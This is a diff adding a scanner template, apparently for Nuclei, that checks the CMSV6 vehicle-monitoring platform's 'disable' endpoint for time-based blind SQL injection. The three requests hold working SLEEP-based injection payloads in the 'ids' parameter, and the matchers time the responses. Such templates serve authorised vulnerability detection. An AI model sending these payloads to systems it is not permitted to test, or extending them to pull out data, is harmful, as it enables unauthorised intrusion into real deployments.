@@ -1,0 +1,44 @@
+id: g-sky-cmsserverv6-disable-sqli
+info:
+  name: 通天星 CMSV6 disable 接口 - SQL 注入漏洞
+  author: secking
+  severity: high
+  metadata:
+    verified: true
+    max-request: 3
+    vuln-id: CT-1378616
+    vendor: g-sky
+    product: cmsv6
+  tags: sqli,vuln,g-sky,cmsv6
+variables:
+  sleepSecond1: '{{rand_int(6, 7)}}'
+  sleepSecond2: '{{rand_int(3, 4)}}'
+  r0: '{{rand_int(10000, 99999)}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids={{r0}}+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%280%29%29%29kOIi%29'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "\"resMap\":")'
+  - max-redirects: 0
+    method: GET
+    path:
+      - '{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids={{r0}}+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%28{{sleepSecond1}}%29%29%29kOIi%29'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond1 * 1000 - 1000'
+  - max-redirects: 0
+    method: GET
+    path:
+      - '{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids={{r0}}+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%28{{sleepSecond2}}%29%29%29kOIi%29'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond2 * 1000 - 1000'
